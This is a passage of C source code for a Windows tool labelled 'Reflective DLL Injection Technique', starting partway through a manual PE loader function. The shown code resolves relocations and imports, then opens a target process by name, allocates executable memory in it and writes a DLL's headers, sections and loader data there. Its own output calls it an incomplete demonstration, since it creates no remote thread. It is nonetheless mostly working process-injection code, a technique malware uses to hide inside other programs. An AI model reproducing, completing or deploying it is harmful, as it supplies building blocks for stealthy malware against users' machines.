        DWORD_PTR delta = (DWORD_PTR)loaderData->ImageBase - loaderData->NtHeaders->OptionalHeader.ImageBase;
        
        while (relocation->VirtualAddress) {
            if (relocation->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                DWORD count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD list = (PWORD)(relocation + 1);
                
                for (DWORD i = 0; i < count; i++) {
                    if (list[i]) {
                        PDWORD_PTR ptr = (PDWORD_PTR)((LPBYTE)loaderData->ImageBase + (relocation->VirtualAddress + (list[i] & 0xFFF)));
                        *ptr += delta;
                    }
                }
            }
            
            relocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)relocation + relocation->SizeOfBlock);
        }
    }
    
    // Process imports
    if (loaderData->ImportDirectory && loaderData->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR importDesc = loaderData->ImportDirectory;
        
        while (importDesc->Name) {
            LPCSTR libName = (LPCSTR)((LPBYTE)loaderData->ImageBase + importDesc->Name);
            HMODULE hLib = loaderData->fnLoadLibraryA(libName);
            
            if (hLib) {
                PIMAGE_THUNK_DATA thunk = NULL;
                PIMAGE_THUNK_DATA funcRef = NULL;
                
                if (importDesc->OriginalFirstThunk) {
                    thunk = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->OriginalFirstThunk);
                    funcRef = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);
                } else {
                    thunk = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);
                    funcRef = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);
                }
                
                while (thunk->u1.AddressOfData) {
                    if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                        funcRef->u1.Function = (DWORD_PTR)loaderData->fnGetProcAddress(hLib, (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal));
                    } else {
                        PIMAGE_IMPORT_BY_NAME funcName = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)loaderData->ImageBase + thunk->u1.AddressOfData);
                        funcRef->u1.Function = (DWORD_PTR)loaderData->fnGetProcAddress(hLib, funcName->Name);
                    }
                    
                    thunk++;
                    funcRef++;
                }
            }
            
            importDesc++;
        }
    }
    
    // Call DLL entry point
    if (loaderData->NtHeaders->OptionalHeader.AddressOfEntryPoint) {
        DllMainFunc dllMain = (DllMainFunc)((LPBYTE)loaderData->ImageBase + loaderData->NtHeaders->OptionalHeader.AddressOfEntryPoint);
        return dllMain((HINSTANCE)loaderData->ImageBase, DLL_PROCESS_ATTACH, NULL);
    }
    
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <process_name> <dll_path>\n", argv[0]);
        printf("Example: %s notepad.exe C:\\\\path\\\\to\\\\your.dll\n", argv[0]);
        return 1;
    }
    
    const char* processName = argv[1];
    const char* dllPath = argv[2];
    
    printf("[*] Reflective DLL Injection Technique\n");
    printf("[*] Target Process: %s\n", processName);
    printf("[*] DLL Path: %s\n", dllPath);
    
    // Step 1: Read DLL file
    HANDLE hFile = CreateFileA(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Error: Failed to open DLL file. Error: %d\n", GetLastError());
        return 1;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* pDllData = (BYTE*)malloc(fileSize);
    
    DWORD bytesRead;
    if (!ReadFile(hFile, pDllData, fileSize, &bytesRead, NULL)) {
        printf("[!] Error: Failed to read DLL file\n");
        CloseHandle(hFile);
        free(pDllData);
        return 1;
    }
    CloseHandle(hFile);
    printf("[+] DLL loaded into memory (%d bytes)\n", fileSize);
    
    // Step 2: Parse PE headers
    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pDllData;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Error: Invalid DOS signature\n");
        free(pDllData);
        return 1;
    }
    
    IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*)(pDllData + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Error: Invalid NT signature\n");
        free(pDllData);
        return 1;
    }
    printf("[+] Valid PE file detected\n");
    
    // Step 3: Get target process
    DWORD pid = GetProcessIdByName(processName);
    if (pid == 0) {
        printf("[!] Error: Process '%s' not found\n", processName);
        free(pDllData);
        return 1;
    }
    printf("[+] Found process with PID: %d\n", pid);
    
    // Step 4: Open process
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );
    
    if (hProcess == NULL) {
        printf("[!] Error: Failed to open process. Error: %d\n", GetLastError());
        free(pDllData);
        return 1;
    }
    printf("[+] Process handle obtained\n");
    
    // Step 5: Allocate memory for DLL image
    LPVOID pRemoteImage = VirtualAllocEx(
        hProcess,
        NULL,
        pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (pRemoteImage == NULL) {
        printf("[!] Error: Failed to allocate memory for image. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        free(pDllData);
        return 1;
    }
    printf("[+] Remote image allocated at: 0x%p (%d bytes)\n", pRemoteImage, pNtHeaders->OptionalHeader.SizeOfImage);
    
    // Step 6: Copy headers
    if (!WriteProcessMemory(hProcess, pRemoteImage, pDllData, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
        printf("[!] Error: Failed to write headers\n");
        VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(pDllData);
        return 1;
    }
    printf("[+] Headers written\n");
    
    // Step 7: Copy sections
    IMAGE_SECTION_HEADER* pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (!WriteProcessMemory(
            hProcess,
            (PVOID)((LPBYTE)pRemoteImage + pSectionHeader[i].VirtualAddress),
            (PVOID)(pDllData + pSectionHeader[i].PointerToRawData),
            pSectionHeader[i].SizeOfRawData,
            NULL
        )) {
            printf("[!] Error: Failed to write section %s\n", pSectionHeader[i].Name);
        } else {
            printf("[+] Section %s written\n", pSectionHeader[i].Name);
        }
    }
    
    // Step 8: Allocate and write loader data
    LOADER_DATA loaderData = {0};
    loaderData.ImageBase = pRemoteImage;
    loaderData.NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pRemoteImage + pDosHeader->e_lfanew);
    
    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        loaderData.BaseRelocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)pRemoteImage + 
            pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    }
    
    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        loaderData.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)pRemoteImage + 
            pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    }
    
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    loaderData.fnLoadLibraryA = (LoadLibraryAFunc)GetProcAddress(hKernel32, "LoadLibraryA");
    loaderData.fnGetProcAddress = (GetProcAddressFunc)GetProcAddress(hKernel32, "GetProcAddress");
    
    LPVOID pRemoteLoaderData = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(LOADER_DATA),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (pRemoteLoaderData == NULL) {
        printf("[!] Error: Failed to allocate memory for loader data\n");
        VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(pDllData);
        return 1;
    }
    
    if (!WriteProcessMemory(hProcess, pRemoteLoaderData, &loaderData, sizeof(LOADER_DATA), NULL)) {
        printf("[!] Error: Failed to write loader data\n");
        VirtualFreeEx(hProcess, pRemoteLoaderData, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(pDllData);
        return 1;
    }
    printf("[+] Loader data written\n");
    
    printf("[*] Note: Full reflective injection requires a loader stub\n");
    printf("[*] This implementation demonstrates the concept\n");
    printf("[+] Reflective DLL injection setup completed\n");
    
    // Cleanup
    VirtualFreeEx(hProcess, pRemoteLoaderData, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    free(pDllData);
    
    return 0;
}
